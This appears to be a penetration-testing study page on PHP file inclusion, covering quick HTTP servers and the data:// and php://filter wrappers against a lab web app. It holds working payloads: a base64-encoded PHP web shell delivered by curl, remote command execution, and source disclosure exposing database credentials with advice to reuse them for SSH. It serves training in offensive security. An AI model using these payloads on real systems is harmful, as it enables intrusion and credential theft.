---
description: Some useful tools that can make file inclusion exploitation simpler
---

# Expanding File Inclusion Repertoire

## HTTP Servers

### Apache

Apache is included by default in Kali and can be used to expose files placed in the `/var/www/html` directory structure via HTTP.

### Python

Python can be used to start an HTTP server and host any files or directories from the current working path.

#### Python 2.x

One can start an HTTP server on an arbitrary port in Python 2.x by setting `-m SimpleHTTPServer` to set the desired module and 7331 (or any valid port number) to set the TCP port:

```bash
kali@kali:~$ python -m SimpleHTTPServer 7331
Serving HTTP on 0.0.0.0 port 7331 ...
```

#### Python 3.x

The syntax is slightly different with Python 3.x as the module name is different:

```bash
kali@kali:~$ python3 -m http.server 7331
Serving HTTP on 0.0.0.0 port 7331 (http://0.0.0.0:7331/) ...
```

### PHP

PHP includes a built-in web server that can be launched with the -S flag followed by the address and port to use:

```bash
kali@kali:~$ php -S 0.0.0.0:8000
PHP 7.3.8-1 Development Server started at Wed Aug 28 12:59:52 2019
Listening on http://0.0.0.0:8000
Document root is /home/kali
Press Ctrl-C to quit.
```

### Ruby

One can also launch an HTTP server with a Ruby "one liner". The command requires several flags including `-run` to load `un.rb`, which contains replacements for common Unix commands, `-e httpd` to run the HTTP server, `.` to serve content from the current directory, and `-p 9000` to set the TCP port:

```bash
kali@kali:~$ ruby -run -e httpd . -p 9000
[2019-08-28 12:44:14] INFO  WEBrick 1.4.2
[2019-08-28 12:44:14] INFO  ruby 2.5.5 (2019-03-15) [x86_64-linux-gnu]
[2019-08-28 12:44:14] INFO  WEBrick::HTTPServer#start: pid=1367 port=9000
```

### busybox

Attackers can also use busybox, "the Swiss Army Knife of Embedded Linux", to run an HTTP server with `httpd` as the function, `-f` to run interactively, and `-p 10000` to run on TCP port 10000:

```bash
kali@kali:~$ busybox httpd -f -p 10000
```

## PHP Wrappers

PHP provides several protocol wrappers that one can use to exploit directory traversal and local file inclusion vulnerabilities. These filters give additional flexibility when attempting to inject PHP code via LFI vulnerabilities.

### Data

One can use the `php://data` wrapper to embed inline data as part of the URL with plaintext or base64 encoded data. This wrapper provides users with an alternative payload when they cannot poison a local file with PHP code.

To exploit it, the `allow_url_include` setting needs to be enabled for the web application.

#### Example 1

Continuing with the vulnerable `/menu.php` page:

```
http://10.11.0.22/menu.php?file=data:text/plain,hello world
```

<figure><img src="../../.gitbook/assets/PHPDataWrapperExample.png" alt="Data tag rendered as page text"><figcaption><p>data tag rendered as HTML text</p></figcaption></figure>

In extreme cases, this can be taken even farther to allow direct code execution:

```
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

<figure><img src="../../.gitbook/assets/PHPDataWrapperExecutionExample.png" alt=""><figcaption><p>Command execution via data tag</p></figcaption></figure>

#### Example 2

This example will revisit the "Mountain Desserts" web application that was used in previous LFI examples.

For reference this application is vulnerable to a LFI vulnerability via the `page` URL parameter:

```
http://mountaindesserts.com/meteor/index.php?page=<LFI_HERE>
```

In this example a PHP payload will be submitted via the `data//` wrapper.

As noted in Example 1 sometimes this can be as simple as submitting the code snippet in plain text via the wrapper (Note the snippet should be URL encoded before being included):

```php
<?php echo system('ls');?>
```

URL encoded to:

```
<?php%20echo%20system('ls');?>
```

Then embedded via `curl`:

```shell-session
kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
...
```

This was successful in this example, however there are often web application firewalls or other security mechanisms in place. When present, they may filter strings like `system` or other PHP code elements.&#x20;

In such a scenario, one can try to use the `data://` wrapper with base64-encoded data. The desired PHP snippet is:

```php
<?php echo system($_GET["cmd"]);?>
```

This snippet will fetch a command from the URL and execute it. First the snippet must be encoded to base64, and then submitted with the `data://text/plain;base64` wrapper

```shell-session
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
...
```



### Filter

PHP filters (`php://filter`) allow perform basic **modification operations on the data** before being it's read or written.

One can use the filter wrapper to display the contents of files either with or without encodings like ROT13 or Base64.&#x20;

Using `php://filter`, one can also display the contents of executable files (such as any `.php` files), rather than executing them. This allows attackers to review PHP files for sensitive information and analyze the web application's logic.

#### Filter Categories

There are 5 categories of filters:

1. String Filters
   * `string.rot13`
   * `string.toupper`
   * `string.tolower`
   * `string.strip_tags`: Remove tags from the data (everything between "<" and ">" chars)
     * Note that this filter has disappear from the modern versions of PHP
2. Conversion Filters
   * `convert.base64-encode`
   * `convert.base64-decode`
   * `convert.quoted-printable-encode`
   * `convert.quoted-printable-decode`
   * `convert.iconv.*` : Transforms to a different encoding(`convert.iconv.<input_enc>.<output_enc>`) .&#x20;
     * To get the list of all the encodings supported run in the console: `iconv -l`
     * Abusing the `convert.iconv.*` conversion filter you can generate arbitrary text, which could be useful
   * `convert.*`
3. Compression Filters
   * `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
   * `zlib.inflate`: Decompress the data
4. Encryption Filters
   * `mcrypt.*` : Deprecated
   * `mdecrypt.*` : Deprecated
5. Other Filters
   * `consumed`
   * `dechunk`: reverses HTTP chunked encoding
   * Running `var_dump(stream_get_filters());`  in PHP will yield a complete list of filters

#### Example

This example will revisit the "Mountain Desserts" web application that was used in previous LFI examples.

For reference this application is vulnerable to a LFI vulnerability via the `page` URL parameter:

```
http://mountaindesserts.com/meteor/index.php?page=<LFI_HERE>
```

In previous examples the path back to the home directory required 9 level jumps (`../../../../../../../../../`).

With this in mind, first the `admin.php` page will be queried:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
</strong>...
&#x3C;a href="index.php?page=admin.php">&#x3C;p style="text-align:center">Admin&#x3C;/p>&#x3C;/a>
&#x3C;!DOCTYPE html>
&#x3C;html lang="en">
&#x3C;head>
    &#x3C;meta charset="UTF-8">
    &#x3C;meta name="viewport" content="width=device-width, initial-scale=1.0">
    &#x3C;title>Maintenance&#x3C;/title>
&#x3C;/head>
&#x3C;body>
        &#x3C;span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
</code></pre>

This yields the same page found via a browser. It is worth noting that in this version the `<body>` tag is not actually closed. PHP code will be executed server side and, as such, is not shown. When  this output is compared with previous inclusions or a review of the source code in the browser, one can conclude that the rest of the `index.php` page's content is missing.

The `php://filter` can be used to better understand what is happening.

No encoding will be used on the first attempt. The PHP wrapper uses `resource` as the required parameter to specify the file stream for filtering, which is the filename in this case. One can also specify absolute or relative paths in this parameter:

```shell-session
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```

The output is the same as the first attempt. This makes sense since the PHP code is included and executed via the LFI vulnerability.

Instead, try encoding the output with Base64:

```shell-session
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...
```

This seems to have yielded something. The output can be decoded by piping the output to `base64 -d`:

```shell-session
kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php
$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);

// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}
echo "Connected successfully";
?>

</body>
</html>
```

Note that this has indeed yielded the end of the `</body>` tag indicating this is what was missing in the previous queries.

Beyond that, the decoded data contains MySQL connection information, including a username and password. One could use these credentials to connect to the database or try the password for user accounts via SSH.
